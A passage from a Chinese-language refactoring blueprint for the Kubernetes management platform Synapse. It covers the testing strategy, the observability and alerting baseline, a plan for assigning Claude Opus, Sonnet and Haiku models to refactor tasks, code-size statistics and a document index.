- 單一檔案測試時間 < 5s
- 不依賴外部服務（無網路、無真 DB）
- 測試名稱明確：`TestClusterService_GetCluster_WhenNotFound_ReturnsError`

**覆蓋率目標（Phase 2 GA）：**

- Service: ≥ 60%
- Repository: ≥ 80%
- 前端 component: ≥ 40%

### 13.3 整合測試（Integration）

**範圍：** Handler + Service + Repository 全鏈路；實際 DB；K8s fake client

**工具：**

- 後端：`testing` + `httptest.NewRecorder` + `gorm` 連 `sqlite :memory:` 或 `testcontainers-go` PostgreSQL
- K8s：`k8s.io/client-go/kubernetes/fake` 或 `envtest`（kube-apiserver + etcd local）

**規範：**

- 每個 handler 至少 3 個 case：happy path、validation error、K8s error
- 測試時間 < 30s per package
- CI 執行時間 < 5 min 全部 integration tests

**覆蓋率目標（Phase 2 GA）：**

- Handler: ≥ 40%

### 13.4 端到端測試（E2E）

**範圍：** 使用者關鍵使用流程，從 UI 點擊到後端回應

**工具：** Playwright（推薦，TypeScript-friendly）

**必測流程（Phase 2 GA 清單）：**

1. 登入 → 建立 cluster → 查看 cluster overview
2. 匯入 kubeconfig → workload 列表 → 進入 deployment 詳情
3. 建立 deployment via Modal → 驗證出現在列表
4. 修改 replica → rollout 完成 → 驗證 pod 數
5. 建立 ConfigMap/Secret → mount 到 deployment
6. 查看 log center → 選特定 pod → 串流正常
7. NetworkPolicy 建立 → 跨 namespace 連線被阻擋
8. Rollout 操作：pause / resume / promote
9. HPA 建立 + 觀察 metrics
10. 登出 → 驗證 token 失效

**執行頻率：**

- 每次 PR：跑 smoke（1~3 個核心流程）
- 每日定時：跑完整套
- 每個 Release Candidate：全套 + 手動 exploratory

### 13.5 Contract Test（OpenAPI 契約）

**當前缺失：** 前後端之間沒有契約驗證，後端改 schema 前端炸。

**方案（Phase 2 後）：**

- 後端每次 build 產生 `openapi.json`
- 前端 CI 驗證 `openapi.json` 與前一版的 breaking change
- 破壞性改動需 bump API version 或 flag

### 13.6 Performance / Load Test

**工具：** `k6` or `vegeta`

**場景（Phase 3 GA）：**

- 100 concurrent users 登入 + 查詢 cluster overview
- 50 concurrent users 開啟 log SSE 連線（含 CI/CD Pipeline log follow 路徑）
- 5000 pods 在 1 個 cluster 時的 pod list 分頁 API P95 < 1s
- Webhook 洪水：50 QPS 打 5 分鐘，驗證 replay protection + rate limit 正常，且不產生重複 PipelineRun

**報告：** 存於 `docs/performance/YYYY-MM-benchmark.md`，可比較不同 release 的效能 regression。

### 13.7 測試基礎設施需求

- CI：每次 PR 跑 unit + integration，E2E 只跑 smoke
- CI：nightly 跑完整 E2E + perf
- 測試資料：`testdata/` 目錄；不共用 mutable 狀態
- Flaky test 零容忍：連續失敗 2 次 → 自動 quarantine + 開 issue

---

## 十四、Observability Baseline

重構過程中最怕「改壞了但沒發現」。Phase 1 結束時必須建立 observability 基線，讓後續改動能以數據驅動判斷好壞。

### 14.1 Three Pillars 覆蓋

#### Pillar 1 — Metrics（Prometheus）

**Golden Signals（每個 service 都要有）：**

```
# Latency
http_request_duration_seconds{method, path, status}         histogram

# Traffic
http_requests_total{method, path, status}                   counter

# Errors
http_requests_total{status=~"5.."}                          counter

# Saturation
go_goroutines                                               gauge
process_resident_memory_bytes                               gauge
db_connections_in_use                                       gauge
```

**業務 metrics（Phase 2 前列上線清單）：**

```
cluster_informer_last_sync_age_seconds{cluster}             gauge
cluster_connection_status{cluster, status}                  gauge
workload_operations_total{cluster, kind, action, result}    counter
audit_log_writes_total{action}                              counter
auth_login_attempts_total{result}                           counter
auth_token_blacklist_size                                   gauge
feature_flag_evaluations_total{flag, result}                counter
```

**Phase 1 Exit：** 至少 Golden Signals + `cluster_informer_*` 已導出到 Prometheus

#### Pillar 2 — Logs

**結構化 log 規範：**

```go
logger.Info("operation completed",
    "trace_id", traceID,       // 與 Pillar 3 串接
    "cluster_id", clusterID,
    "user_id", userID,
    "action", "create_deployment",
    "duration_ms", 123,
    "result", "success",
)
```

**三個必要欄位：** `trace_id`（追蹤用）、`user_id`（稽核用）、`cluster_id`（多叢集用）

**Log Level 規範：** 已於 `CLAUDE.md §9` 定義，本節不重複。

#### Pillar 3 — Traces（OpenTelemetry）

**Phase 2 完成後必測 trace path：**

1. HTTP request → Handler → Service → Repository → DB
2. HTTP request → Handler → Service → K8s API → Informer cache
3. Background worker → Service → DB / K8s API
4. Webhook → ReplayProtection / RateLimit → Pipeline Executor / Scheduler → Job Create → Job Watch → pipeline_logs append

> CI/CD 補充：M13a 階段的 Scheduler / Recover / GC Worker 為 single-active controller；若未導入 leader election，trace 與壓測都應只驗證單一 active worker 的正確性，不應假設多活背景調度已成立。

**採樣策略：**

- Head-based：1% random sample
- Tail-based（collector 層）：`status = error` 全採樣；`duration > 1s` 全採樣
- Debug 模式：以 header `X-Debug-Trace: true` 強制採樣

### 14.2 Dashboard 基線（Phase 1 結束）

必須建立以下 Grafana dashboard（存於 `deploy/grafana/dashboards/`）：

1. **Synapse Golden Signals**：每個 endpoint 的 latency / traffic / error
2. **Cluster Health**：每個 managed cluster 的 connection status、informer lag、resource usage
3. **Audit Activity**：每日 audit log 量、Top 10 操作、可疑行為（大量 delete 等）
4. **Auth & Security**：登入成功/失敗率、token blacklist 趨勢、rate limit 命中率
5. **Background Workers**：EventAlert / Cost / LogRetention / CertExpiry / ImageIndex 各 worker 的 tick 次數、錯誤率、耗時

### 14.3 告警基線（Phase 2 結束）

**P0（立刻呼叫 oncall）：**

- `up{job="synapse"} == 0`（任何實例 down）
- `rate(http_requests_total{status=~"5.."}[5m]) > 0.05`（5xx 率 > 5%）
- `synapse_database_connection_status == 0`
- `auth_login_attempts_total{result="success"}[30m] == 0`（完全無人能登入 = 登入系統壞了）

**P1（工作時間內處理）：**

- `cluster_informer_last_sync_age_seconds > 300`
- `histogram_quantile(0.95, http_request_duration_seconds) > 2`
- `go_goroutines > 10000`（goroutine leak 徵兆）
- `audit_log_writes_total == 0`（audit 系統壞了）

**P2（每日 digest）：**

- 覆蓋率 regression > 5%
- Flaky test 數量 > 10
- 冷資料：某個 handler 30 天無流量 → 可能死代碼

### 14.4 Observability 成本控制

- Metrics：保留 14 天 high-res + 90 天 downsample
- Logs：7 天 hot（全索引）+ 30 天 cold（archive only）
- Traces：3 天（已經採樣後的）
- 總儲存成本預算：≤ 專案月預算 5%

---

## 十五、Claude Code 模型分工建議

> 本章節是給「使用 Claude Code 實際執行本藍圖」的工程師看的操作手冊。
> 目的：把**任務的性質**對應到**最符合成本效益的模型**，避免「什麼都用 Opus」（燒錢）或「什麼都用 Haiku」（翻車）。
> 原則：**風險/設計深度用大模型、樣板複製用小模型、批量機械工作用最小模型**。

### 15.1 模型選擇基準表

Synapse 目前支援的 Claude Code 模型家族（截至 2026-04）：

| 模型                                               | 適用任務                                                                                         | 不適用任務                             | 對應本藍圖                                                                                          |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------- | --------------------------------------------------------------------------------------------------- |
| **Claude Opus 4.6** (`claude-opus-4-6`)            | 架構設計、跨檔案重構、安全審查、威脅建模、ADR 撰寫、資料庫 schema 設計、演算法核心、疑難雜症除錯 | 純樣板複製、批量字串替換、純 lint 修正 | P0 安全修復、Repository 介面設計、多租戶/加密/雜湊鏈、Operator、gRPC schema                         |
| **Claude Sonnet 4.6** (`claude-sonnet-4-6`)        | 依模板實作、功能開發、單元測試、常規 refactor、handler/service 新增、標準 bug 修復               | 極細的安全決策、跨數十檔案的大型設計   | Handler 拆分、路由分檔、Repository 推廣、Zustand 導入、Operator reconcile loop 實作                 |
| **Claude Haiku 4.5** (`claude-haiku-4-5-20251001`) | 批量文字替換、i18n 翻譯填值、簡易 lint 修復、README/註解補完、CI script 小改、模板套用           | 任何需要「判斷」的任務、安全敏感檔案   | `username == "admin"` 替換、swag 註解補齊、i18n 英文翻譯、lazy loading 套用、ErrorBoundary 樣板套用 |

**三條硬規則（任何 Phase 都適用）：**

1. **安全 / 加密 / 權限 / JWT / crypto / 多租戶**：一律 **Opus**。不論任務看起來多小（包含「只改一個 if」），只要檔名或 diff 觸及安全面，升到 Opus。
2. **超過 3 個檔案的跨檔案 refactor**：優先 **Opus** 規劃 → 產出模板檔 → 其餘檔案讓 **Sonnet** 依模板實作。
3. **純批量（30+ 檔案相同 pattern）**：先讓 Opus 寫 1 個完整範本（含測試）→ Haiku 執行批量套用 → Sonnet 補修個別例外。

### 15.2 Phase 0–4 逐任務模型指派

#### Phase 0 — 急救（1~2 週）

| 任務 ID | 任務                                          | 主力模型   | 原因                                      |
| ------- | --------------------------------------------- | ---------- | ----------------------------------------- |
| P0-1    | 移除 Salt 日誌輸出                            | **Sonnet** | 單點修改，但涉及日誌安全需確認無側洩      |
| P0-2a   | 新增 `SystemRole` 欄位 + migration 設計       | **Opus**   | DB schema 變更 + 權限模型設計             |
| P0-2b   | 替換所有 `username == "admin"`（6 處）        | **Haiku**  | Opus/Sonnet 先出 1 處範本，Haiku 批量替換 |
| P0-3    | 修復 `TestDeleteUserGroup_Success`            | **Sonnet** | 事務保護補強，需理解 permission service   |
| P0-5    | JWT `jti` + `token_blacklist` 表 + middleware | **Opus**   | 安全關鍵，需審查整條認證鏈                |
| P0-6    | Token 移出 localStorage                       | **Sonnet** | 前端改動，標準 pattern                    |
| CI-1    | `make check` target 設計                      | **Sonnet** | Makefile 標準樣板                         |
| CI-2    | pre-commit hook                               | **Haiku**  | 純 shell script + git hook 樣板           |

**Phase 0 成本估算基準**：Opus ~30% / Sonnet ~55% / Haiku ~15%。總 token 預算可用 Sonnet 定額的 1.4 倍。

#### Phase 1 — 止血（4~6 週）

| 任務 ID  | 任務                                      | 主力模型                             | 原因                                                                                                  |
| -------- | ----------------------------------------- | ------------------------------------ | ----------------------------------------------------------------------------------------------------- |
| ✅ P0-4a | Repository 介面設計 + BaseRepository 抽象 | **Opus**                             | 架構定調，錯了會影響全部 40+ handler（**已完成 2026-04-09**，見 `docs/adr/0001-repository-layer.md`） |
| ✅ P0-4b | Cluster/User/Permission Repository 實作   | **Sonnet**                           | 依 `docs/REFACTOR_HANDLER_GUIDE.md` 模板實作（**已完成 2026-04-09**，23 個 sqlmock 測試全通過）       |
| P1-2a    | 路由拆分總體結構設計                      | **Opus**                             | 10 domain 切分原則                                                                                    |
| P1-2b    | 實際拆分 routes\_\*.go                    | **Sonnet**                           | 依 Opus 給的骨架執行                                                                                  |
| P1-3     | Service Interface 化                      | **Opus**（設計）+ **Sonnet**（推廣） | 先設計介面，再批量改寫                                                                                |
| P1-4     | swaggo/swag 註解 + OpenAPI 生成           | **Haiku**                            | 純註解批量補齊                                                                                        |
| P1-6     | Axios timeout 分層                        | **Sonnet**                           | 前端樣板改動                                                                                          |
| P1-7     | 全域 ErrorBoundary                        | **Haiku**                            | 單一組件套用到 router tree                                                                            |
| P1-9a    | Service 層測試補齊（→30%）                | **Sonnet**                           | 標準單元測試                                                                                          |
| CONTRIB  | `docs/CONTRIBUTING.md`                    | **Sonnet**                           | 文件撰寫                                                                                              |

**Phase 1 成本估算基準**：Opus ~15% / Sonnet ~65% / Haiku ~20%。

#### Phase 2 — 體質改善（2~3 個月）

| 任務 ID | 任務                              | 主力模型                               | 原因                               |
| ------- | --------------------------------- | -------------------------------------- | ---------------------------------- |
| P0-4c   | Repository 全面推廣（40 handler） | **Sonnet**                             | 樣板已定，純依樣實作               |
| P1-1    | Handler 拆分至 < 500 行（10+ 個） | **Sonnet**                             | 機械性拆分，但需確保測試不破       |
| P1-5    | 前端頁面肥胖症 Top 10             | **Sonnet**                             | 組件拆分                           |
| P1-8    | Redis RateLimiter                 | **Opus**（演算法）+ **Sonnet**（整合） | token bucket 邊界條件              |
| P1-9b   | 測試覆蓋率 → 60%                  | **Sonnet**                             | 標準單元測試                       |
| P1-10   | OpenTelemetry 導入                | **Opus**                               | trace context 傳遞、取樣策略       |
| P2-4    | golang-migrate 取代 AutoMigrate   | **Opus**                               | schema 遷移策略 + 回滾路徑         |
| P2-8    | Informer 健康檢查                 | **Sonnet**                             | 依 ClusterInformerManager 模式擴展 |

**Phase 2 成本估算基準**：Opus ~15% / Sonnet ~60% / Haiku ~25%。

#### Phase 3 — 擴展基礎（4~6 個月）

| 任務 ID | 任務                                  | 主力模型                                 | 原因                               |
| ------- | ------------------------------------- | ---------------------------------------- | ---------------------------------- |
| P2-1    | Multi-tenant 能力                     | **Opus** 全程                            | 租戶隔離設計、RLS、跨表 query 改寫 |
| P2-2    | 審計日誌雜湊鏈                        | **Opus**                                 | 密碼學正確性（hash chain、防篡改） |
| P2-3    | 全面欄位加密                          | **Opus**（設計）+ **Sonnet**（欄位推廣） | 加密欄位型別、key rotation         |
| P2-5    | Zustand 狀態管理                      | **Sonnet**                               | 前端架構標準重構                   |
| P2-7    | i18n 英文完整化                       | **Haiku**                                | 翻譯字串填值                       |
| P2-9    | Bundle size monitoring + lazy loading | **Haiku**                                | Webpack/Vite 設定 + 路由改寫樣板   |
| 6.x     | 深化功能實作 2~3 項                   | **Sonnet**                               | 視功能而定，若為 AI/安全則升 Opus  |

**Phase 3 成本估算基準**：**Opus ~30%** / Sonnet ~55% / Haiku ~15%。這是 Opus 比重最高的 Phase 之一，因為安全基礎設施集中在此階段。

#### Phase 4 — 平台化（6~12 個月）

| 任務 ID | 任務                | 主力模型      | 原因                                          |
| ------- | ------------------- | ------------- | --------------------------------------------- |
| PLAT-1  | Helm Chart HA 部署  | **Opus**      | PodAntiAffinity、Leader Election、PDB 設計    |
| PLAT-2  | Synapse Operator    | **Opus** 全程 | CRD schema、reconcile loop、finalizer、狀態機 |
| PLAT-3  | 6.x 剩餘功能        | **Sonnet**    | 依前期模式推廣                                |
| PLAT-4  | gRPC API 選擇性開放 | **Opus**      | proto 設計、版本策略、雙協議共存              |
| PLAT-5  | Plugin 機制試點     | **Opus** 全程 | 插件介面 ABI、沙箱、版本相容性                |

**Phase 4 成本估算基準**：**Opus ~35%** / Sonnet ~55% / Haiku ~10%。平台化任務幾乎全部是架構級決策，Opus 比重最高。

### 15.3 跨 Phase 常駐任務（貫穿 Phase 0–4）

| 任務類型                   | 建議模型              | 說明                              |
| -------------------------- | --------------------- | --------------------------------- |
| **Code Review**            | **Opus**              | PR diff 審查需全域視野與風險嗅覺  |
| **Bug 復現 + 修復**        | **Opus** → **Sonnet** | Opus 判斷根因 → Sonnet 補 patch   |
| **CI 失敗排查**            | **Sonnet**            | 多數為 flaky test / 環境問題      |
| **文件校稿 / typo**        | **Haiku**             | 純文字                            |
| **commit message 撰寫**    | **Haiku**             | 套用 conventional commit 格式     |
| **i18n 新增一個詞條**      | **Haiku**             | 複製既有 pattern                  |
| **新 handler 按模板建立**  | **Sonnet**            | 遵循 CLAUDE.md §13 範本           |
| **ADR 撰寫**               | **Opus**              | §十二 所列 10 條 ADR 皆為架構決策 |
| **威脅建模 / STRIDE 檢視** | **Opus**              | 需全域安全視野                    |

### 15.4 模型切換決策流程（SOP）

當你（或 Claude Code 本身）在選模型時，依序問以下問題，第一個命中的答案就是該任務的模型：

```
1. 這個任務會碰到 crypto / JWT / 多租戶 / 權限模型 嗎？
   └ 是 → Opus
2. 這個任務需要跨 4+ 個檔案 或 需要『設計新的介面』嗎？
   └ 是 → Opus
3. 這個任務有現成的模板可直接複製嗎（包括 CLAUDE.md §13 handler 範本）？
   └ 是 → Sonnet（如果要按模板實作 1~3 個檔案）
         Haiku（如果只是純文字替換 / 搬運）
4. 這個任務的失敗會導致 production incident 嗎？
   └ 是 → Opus（寧可燒錢，不可翻車）
5. 這個任務是 test / lint / docs / i18n / typo 嗎？
   └ 是 → Haiku
6. 其他一切情況 → Sonnet（預設值）
```

### 15.5 成本優化小技巧

- **Opus 產範本、Sonnet 執行**：涉及 3 檔案以上的任務，先讓 Opus 產出 1 個「完整含測試」範本，再交 Sonnet 推廣。單次 Opus 成本攤提到 N 檔案上，總成本遠低於 N 次 Opus。
- **Haiku 先跑、Opus 把關**：批量機械任務（i18n、註解補齊），先讓 Haiku 一次跑完，最後讓 Opus 審 diff 一次，catch 異常樣本。
- **Sonnet 預設、Opus 升級**：除非本章明確列為 Opus 任務，否則預設用 Sonnet。遇到不確定時才升 Opus。
- **禁止 Haiku 碰安全檔案**：凡是 `internal/middleware/auth*.go` / `pkg/crypto/*.go` / `*token*.go` / `*rbac*.go`，Haiku 一律不碰（無論多小的改動）。
- **Code Review 反向原則**：PR 作者用 Sonnet 寫的程式碼，Review 要用 Opus 看（大模型逆向審查小模型產出，風險抓得準）。

### 15.6 與 §十二 ADR 的關係

§十二 列出的 10 條 ADR（0001–0010）**全部建議使用 Opus 撰寫**。原因：

- ADR 的核心價值在於**替代方案比較**與**後果推演**，這正是大模型的強項
- ADR 寫錯代價極高（後續所有 implementation 都會受影響）
- ADR 屬於一次性工作（不會重複 10 次），成本可控

ADR-0001（Repository 層導入）已在 §十二 附上完整範本，後續 0002–0010 建議沿用相同格式，每次讓 Opus 獨立撰寫一份。

### 15.7 Phase 模型密度熱力圖

把 §15.2 的逐任務指派壓縮成一張可視化圖，方便預算審核與排程會議對齊：

```
          Opus       Sonnet         Haiku
Phase 0   ██████     ███████████    ███       30/55/15  急救
Phase 1   ███        █████████████  ████      15/65/20  止血
Phase 2   ███        ████████████   █████     15/60/25  體質改善
Phase 3   ██████     ███████████    ███       30/55/15  擴展基礎
Phase 4   ███████    ███████████    ██        35/55/10  平台化
```

**觀察**：

- **Opus 密集區**：Phase 0（JWT + 權限模型）、Phase 3（多租戶 + 加密 + 雜湊鏈）、Phase 4（Operator + gRPC + Plugin）
- **Sonnet 主力區**：Phase 1、Phase 2（依 Opus 定好的介面大量推廣樣板）
- **Haiku 比重最高在 Phase 2**：Axios timeout 分層、ErrorBoundary 套用、前端批次 refactor

### 15.8 最危險檔案清單（不論 Phase 一律 Opus）

以下檔案的**任何 PR**（即使只改一行註解）都必須用 Opus，原因是錯誤代價極高、攻擊面大、或屬跨系統整合核心：

```
# Crypto / Auth / RBAC
pkg/crypto/*.go
internal/middleware/auth*.go
internal/services/*token*.go
internal/services/*rbac*.go
internal/services/permission_service.go
internal/models/user.go                 # SystemRole
internal/models/cluster.go              # Kubeconfig 加密 hook

# DB Schema / Migration
internal/database/migrations/*.go

# 跨系統核心
internal/k8s/cluster_informer_manager.go
internal/services/cluster_service.go
```

並與 [CICD_ARCHITECTURE.md §25.1 + §25.8](./CICD_ARCHITECTURE.md#25-claude-code-模型分工建議) 的 CI/CD 專屬危險檔案清單合併使用。

### 15.9 關鍵路徑優先投資建議

若預算有限必須取捨，下表是 Opus 投入的**優先順序**（由高到低），左欄不投資會直接擴散為全專案風險：

| 優先序 | 必保 Opus 投入的任務                                  | 不投資的代價                       |
| ------ | ----------------------------------------------------- | ---------------------------------- |
| 🔴 P0  | Phase 0：`SystemRole` migration + JWT `jti`/blacklist | 現有漏洞無法關閉，整套權限可繞過   |
| 🔴 P0  | Phase 1：Repository 介面設計 + BaseRepository         | 後續 37 個 handler 遷移全部受影響  |
| 🟠 P1  | Phase 3：多租戶 + 加密 + 雜湊鏈                       | 無法商業化、合規無法達標           |
| 🟠 P1  | Phase 4：Synapse Operator 與 Helm HA                  | 無法做 HA 部署，無法進入生產       |
| 🟡 P2  | Phase 2：OpenTelemetry 導入 + golang-migrate          | 可延後半年，以 Prometheus 指標暫補 |
| 🟡 P2  | Phase 4：gRPC 與 Plugin 機制                          | 可延後至 v2 考量                   |

**可降級為 Sonnet 的場景**（當 Opus 預算吃緊時）：

- 功能深度 §六 的 6.5（CLI/VSCode extension）、6.8（混沌工程）、6.10（自助化流程）
- Phase 2 的 P1-1 Handler 拆分、P1-5 前端肥胖頁面拆分（已有模板）
- 所有 service 層單元測試補齊（P1-9a/9b）

**絕對不可降級為 Sonnet 的紅線**：

- 任何含 `crypto`、`jwt`、`token`、`rbac`、`tenant` 字樣的檔案
- 任何 migration SQL（即使看起來只是加一個欄位）
- §十二 所列的 10 條 ADR

### 15.10 檢查清單：模型選擇是否正確？

每次完成任務後可用以下 checklist 自我驗證：

```
□ 1. 我是不是為了省錢用 Haiku 動了安全檔案？（若是 → 重做）
□ 2. 我是不是為了省事用 Opus 做了純文字替換？（若是 → 下次用 Haiku）
□ 3. 我這個跨檔案 refactor 有沒有先請 Opus 出範本？
□ 4. 我改的檔案如果出錯會不會阻斷 production？有的話是不是用了 Opus？
□ 5. 我做的 PR review 是不是用了至少 Sonnet 等級？（Haiku 不該做 review）
□ 6. 我動的檔案有沒有出現在 §15.8 的危險清單裡？若有是不是用 Opus？
□ 7. 我目前所在 Phase 的 Opus 比重（見 §15.7 熱力圖）有沒有嚴重偏離？
```

---

## 附錄 A：程式碼統計

### A.1 Handler 檔案（前 15 大）

| 檔名                |  行數 |
| ------------------- | ----: |
| rollout.go          | 1,339 |
| networkpolicy.go    | 1,106 |
| deployment.go       | 1,084 |
| storage.go          | 1,045 |
| pod.go              |   979 |
| service.go          |   850 |
| ingress.go          |   849 |
| cluster.go          |   768 |
| multicluster.go     |   758 |
| resource_yaml.go    |   726 |
| log_center.go       |   709 |
| namespace.go        |   669 |
| gateway.go          |   654 |
| kubectl_terminal.go |   647 |

### A.2 Service 檔案（前 15 大）

| 檔名                     |  行數 |
| ------------------------ | ----: |
| prometheus_service.go    | 1,715 |
| om_service.go            | 1,195 |
| gateway_service.go       | 1,107 |
| k8s_client.go            | 1,103 |
| overview_service.go      | 1,083 |
| ai_tools.go              |   963 |
| resource_service.go      |   854 |
| argocd_service.go        |   853 |
| cost_service.go          |   846 |
| alertmanager_service.go  |   762 |
| grafana_service.go       |   687 |
| rbac_service.go          |   685 |
| permission_service.go    |   607 |
| operation_log_service.go |   586 |
| helm_service.go          |   540 |

### A.3 前端頁面（前 15 大）

| 檔名                                |  行數 |
| ----------------------------------- | ----: |
| cost/CostDashboard.tsx              | 1,398 |
| logs/LogCenter.tsx                  | 1,325 |
| node/NodeList.tsx                   | 1,148 |
| workload/DeploymentTab.tsx          | 1,071 |
| workload/tabs/ContainerTab.tsx      |   979 |
| node/NodeDetail.tsx                 |   978 |
| node/NodeOperations.tsx             |   957 |
| pod/PodList.tsx                     |   928 |
| workload/DaemonSetTab.tsx           |   857 |
| workload/CronJobTab.tsx             |   857 |
| workload/JobTab.tsx                 |   856 |
| workload/ArgoRolloutTab.tsx         |   856 |
| permission/PermissionManagement.tsx |   856 |
| workload/StatefulSetTab.tsx         |   855 |

---

## 附錄 B：執行手冊索引

本文件目前是全貌 — 後續拆解的執行細節以下列子文件承接（✅ 表示已完成）：

- ✅ `docs/adr/0001-repository-layer.md` — ADR-0001 Repository 層導入與邊界（Accepted 2026-04-09）
- ✅ `docs/REFACTOR_HANDLER_GUIDE.md` — P0-4 handler 改造 12 步驟檢核表、Pilot 3 domain 指引、Feature Flag 準則
- [ ] `docs/ROLE_MIGRATION_PLAN.md` — P0-2 SystemRole 導入詳細步驟與 rollback 方案
- [ ] `docs/JWT_REVOCATION_DESIGN.md` — P0-5 JWT 黑名單設計 RFC
- [ ] `docs/OBSERVABILITY_PLAN.md` — OpenTelemetry 導入計畫
- [ ] `docs/TEST_STRATEGY.md` — 測試金字塔與 coverage 目標
- [ ] `docs/SECURITY_HEADERS.md` — CSP / HSTS / frame-ancestors 設定

---

## 結語

Synapse 是一個功能驚人、範圍極廣的平台：69 個 handler、50 個 service、137 個前端頁面、超過 16 萬行程式碼，涵蓋工作負載、網路、儲存、安全、監控、成本、AI、多叢集、GitOps、審計等領域。

**它已經是一個「能用的」系統，但還不是一個「好維護的」系統。**

本文件列出的技術債不代表失敗，而是快速開發帶來的正常副產物。真正危險的是視而不見，讓債務利息超過開發速度。

接下來的工作，按本文件的四個 Phase 推進，目標在 **一年內** 把 Synapse 從「功能驚人但脆弱」提升到「功能驚人且穩健」，讓它真正配得上 "synapse" 這個名字 —— 成為叢集之間流暢可靠的神經網路。

---

**文件維護**

- 作者：Claude (Opus 4.6) 協同撰寫
- 最後更新：2026-04-09（v1.7：P0-4c Batch 1/2 進行中 — Wave 1 移除 21 個 K8s handler dead-db；Wave 2 修正 8 個 inline service 建構；Wave 3 Batch 1 為 Notification/NotifyChannel/SIEM/SystemSecurity 四個純 DB handler 建立 Service。41→9 個 handler 仍持有 `*gorm.DB`，Batch 2/3 繼續。）
- 審視週期：每季度一次
- 變更紀錄：見 git log
